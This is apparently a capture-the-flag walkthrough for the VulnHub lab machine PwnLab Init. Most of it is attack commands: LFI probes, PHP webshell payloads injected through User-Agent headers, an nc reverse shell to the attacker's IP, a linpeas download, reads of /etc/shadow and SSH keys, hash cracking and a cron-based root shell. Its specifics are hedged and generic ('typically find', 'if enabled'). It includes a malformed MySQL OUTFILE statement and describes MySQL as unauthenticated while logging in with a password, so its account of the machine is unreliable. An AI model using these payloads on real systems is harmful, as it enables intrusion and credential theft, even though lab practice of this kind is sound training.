# PwnLab Init: OSCP Walkthrough

**Machine:** PwnLab Init
**Platform:** VulnHub
**Link:** https://www.vulnhub.com/entry/pwnlab-init,38/
**Difficulty:** Medium
**Category:** Web Application / LFI / Hash Cracking / Privilege Escalation
**OS:** Linux
**Author:** Raj Chaudhuri / Dhiraj Srinivasan

---

## 🔍 Reconnaissance

```bash
nmap -sC -sV -p- -T4 <TARGET_IP>
```

**Open Ports Found:**
```
22/tcp   open  ssh         OpenSSH
80/tcp   open  http        Apache httpd
3306/tcp open  mysql       MySQL (unauthorized)
```

### Service Version Detection
```bash
nmap -sV -sC -p 22,80,3306 <TARGET_IP>
```

### Web Server Fingerprinting
```bash
whatweb http://<TARGET_IP>
curl -I http://<TARGET_IP>
```

### Web Directory Enumeration
```bash
dirb http://<TARGET_IP> /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,html,zip
dirsearch -u http://<TARGET_IP> -e php,txt,bak,html,asp
feroxbuster -u http://<TARGET_IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html
```

### Nikto Scan
```bash
nikto -h http://<TARGET_IP>
```

### Nmap Database Detection
```bash
nmap -sV -p 3306 --script=mysql-info <TARGET_IP>
```

---

## 🌐 Enumeration

### Web Application Analysis
- PHP-based web application on port 80
- Login page and potentially a configuration or profile page
- Application references MySQL database on port 3306
- Look for file inclusion parameters in URLs

### Identify LFI Parameters
```bash
curl http://<TARGET_IP>/index.php
curl http://<TARGET_IP>/page.php?page=home
curl http://<TARGET_IP>/view.php?file=about
# Test for LFI:
curl "http://<TARGET_IP>/view.php?file=../../../etc/passwd"
curl "http://<TARGET_IP>/page.php?page=php://filter/convert.base64-encode/resource=config.php"
```

### Config File Disclosure
```bash
# Try common config paths
curl http://<TARGET_IP>/config.php
curl http://<TARGET_IP>/includes/config.php
curl "http://<TARGET_IP>/page.php?page=php://filter/convert.base64-encode/resource=config.php"
curl "http://<TARGET_IP>/config.php?file=php://filter/convert.base64-encode/resource=config.php"
```

### Base64 Decode LFI Results
```bash
curl -s "http://<TARGET_IP>/view.php?file=php://filter/convert.base64-encode/resource=config.php" | base64 -d
```

### MySQL Credentials from Config
From config.php you typically find:
```
DB_HOST: localhost
DB_USER: kent
DB_PASS: <password>
DB_NAME: pwnlab
```

### MySQL Connection
```bash
mysql -h <TARGET_IP> -u kent -p<password> pwnlab
```

### MySQL Enumeration
```sql
SHOW DATABASES;
USE pwnlab;
SHOW TABLES;
SELECT * FROM users;
-- Look for password hashes
SHOW COLUMNS FROM users;
```

### Hash Extraction
```bash
# Once inside MySQL:
SELECT username, password FROM users;
# Export to file for cracking
```

### Hash Cracking
```bash
# Save hashes to file
cat hashes.txt

# Using John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt

# Using hashcat (if GPU available)
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Identify hash type first
hash-identifier
```

### Common MySQL Hash Types
- MySQL native: 32-char hex (MD5-based)
- MySQL5: `*` prefix + SHA1 of SHA1
```bash
# Crack mysql hashes with john:
john --format=raw-sha1 hashes.txt
john --format=mysql hashes.txt
john --format=mysql-sha1 hashes.txt
```

---

## 🎯 Exploitation

### Method 1: LFI with Log Poisoning

This is the primary exploitation vector for PwnLab Init.

#### Step 1: Identify LFI Endpoint
```bash
curl "http://<TARGET_IP>/view.php?file=../../../etc/passwd"
curl "http://<TARGET_IP>/page.php? page=phpinfo"  # test reflection
curl "http://<TARGET_IP>/index.php?page=../../config"
```

#### Step 2: Poison Access Logs
Craft a User-Agent header containing PHP code:
```bash
curl -A "<?php system($_GET['cmd']); ?>" http://<TARGET_IP>/
curl -A "<?php @eval(\$_POST['cmd']); ?>" http://<TARGET_IP>/login.php
```

#### Step 3: Include the Log File
```bash
curl "http://<TARGET_IP>/view.php?file=/var/log/apache2/access.log"
# Now access the webshell via:
curl "http://<TARGET_IP>/view.php?file=/var/log/apache2/access.log&cmd=whoami"
```

#### Step 4: Use php://filter for Source Code Reading
```bash
curl "http://<TARGET_IP>/view.php?file=php://filter/convert.base64-encode/resource=config.php"
```

#### Step 5: Include PHP Session Files
```bash
# Inject into session
curl -c cookies.txt http://<TARGET_IP>/
# Session file location: /var/lib/php/sessions/sess_<PHPSESSID>
curl "http://<TARGET_IP>/view.php?file=/var/lib/php/sessions/sess_<PHPSESSID>"
```

### Method 2: LFI to RCE With /proc/self/environ

```bash
# Set User-Agent with PHP payload
curl -A "<?php system($_GET['cmd']); ?>" http://<TARGET_IP>/index.php

# Include process environ
curl "http://<TARGET_IP>/view.php?file=/proc/self/environ"
```

### Method 3: MySQL Credentials to SSH Shell

Use credentials dumped from MySQL to SSH in:
```bash
# If kent user's SSH credentials found in config.php:
ssh kent@<TARGET_IP>
```

### Method 4: Direct MySQL Access Leads to Webshell
```bash
# If MySQL has file write privileges:
mysql> SELECT LOAD_FILE('/etc/passwd');
mysql> INTO OUTFILE '/var/www/html/shell.php'
FIELDS TERMINATED BY '<?php system($_GET[cmd]); ?>'
```

### Get Interactive Shell
```bash
# After LFI webshell
curl "http://<TARGET_IP>/view.php?file=/var/log/apache2/access.log&cmd=rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2>%261|nc+<YOUR_IP>+4444+>/tmp/f"

# Or use netcat reverse shell directly via LFI
curl "http://<TARGET_IP>/view.php?file=php://expect"  # if expect enabled
```

### Alternative Shell Via LFI Wrappers
```bash
# data:// wrapper
curl "http://<TARGET_IP>/view.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg=="

# expect:// wrapper (if enabled)
curl "http://<TARGET_IP>/view.php?file=expect://id"
```

---

## 🔑 Privilege Escalation

### Post-Exploitation Recon (as www-data or web user)
```bash
whoami
id
uname -a
cat /etc/os-release
cat /etc/passwd
```

### SUID Binary Enumeration
```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
```

### Sudo Check
```bash
sudo -l
```

### Credential Harvesting
```bash
# Check web app config for DB credentials
cat /var/www/html/config.php
cat /var/www/html/includes/config.php

# Check other users' home directories
ls -la /home/
cat /home/kent/.bash_history
cat /home/kent/.ssh/id_rsa  # if readable

# Check for password hashes in /etc
cat /etc/shadow 2>/dev/null
grep -r "password" /var/www/html/ 2>/dev/null
grep -r "passwd" /etc/ 2>/dev/null
```

### MySQL Credential Reuse
```bash
# Try MySQL credentials for SSH login
ssh kent@<TARGET_IP> -i /home/kent/.ssh/id_rsa
# Or use passwd from config
ssh kent@<TARGET_IP>
```

### Privilege Escalation Vectors

#### 1. SUID Binary Exploitation
```bash
# If a SUID binary is found:
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null
searchsploit <binary_name> <version>
# Transfer exploit to target and run it
```

#### 2. Writable Cron Jobs
```bash
cat /etc/crontab
ls -la /etc/cron.d/
# If a cron job runs a script we can write to:
echo "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" >> /path/to/writable/cron_script
```

Wait for cron to execute, then:
```bash
/tmp/rootbash -p
```

#### 3. Sudo NOPASSWD
```bash
sudo -l
# If user can run bash as root without password:
sudo /bin/bash
```

#### 4. LinPEAS / LinEnum
```bash
# Upload and run (if webshell is available):
curl http://<YOUR_IP>/linpeas.sh -o /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh
```

#### 5. Kernel Exploit (if kernel is vulnerable)
```bash
cat /proc/version
searchsploit Linux Kernel <version_number>
# Download exploit to target, compile and run
```

### Get Root Shell
```bash
# Method A: Sudo privilege
sudo /bin/bash
sudo -i

# Method B: SUID exploitation
find / -perm -4000 -type f 2>/dev/null
# Copy, exploit, escalate
cp /usr/bin/vulnerable_suid /tmp/exploit
/tmp/exploit

# Method C: Cron job
# Wait for cron, then escalate

# Method D: SSH private key reuse
ssh kent@<TARGET_IP> -i <private_key>
sudo -l  # from new user context
```

---

## 📸 Screenshots

| Step | Screenshot |
|------|-----------|
| Nmap scan results (22, 80, 3306) | *[Image: Nmap Scan]* |
| Web application main page | *[Image: Web App]* |
| LFI vulnerability confirmed | *[Image: LFI Test]* |
| Log poisoning payload via User-Agent | *[Image: Log Poisoning]* |
| MySQL credentials from config.php | *[Image: MySQL Config]* |
| MySQL user table with hashes | *[Image: MySQL Dump]* |
| Hash cracking results (John/hashcat) | *[Image: Hash Cracking]* |
| SUID binary enumeration | *[Image: SUID Enum]* |
| Root flag captured | *[Image: Root Flag]* |

---

## ✅ Key Takeaways

- LFI is a critical web vulnerability that can be chained to RCE via log poisoning
- Log poisoning requires controlled input in HTTP headers (User-Agent, Referer, X-Forwarded-For)
- `/var/log/apache2/access.log` is the most common log inclusion target
- php://filter wrapper allows base64 reading of source files without executing them
- MySQL on port 3306 exposed without authentication is a goldmine for credentials
- Password hash cracking with John the Ripper or hashcat is essential after extraction
- SSH credentials from the application database often lead to privilege escalation
- Always check /etc/passwd for non-standard shells (/bin/bash): this helps identify valid users
- SUID binaries and writable cron scripts are the most common Linux privesc vectors
- Config files (/var/www/html/config.php) frequently contain database credentials in plaintext
- The PHP filter chain `php://filter/convert.base64-encode/resource=` is indispensable for reading source code without triggering filters

---

> M4d3 w1th ❤️ by Ankit Patidar
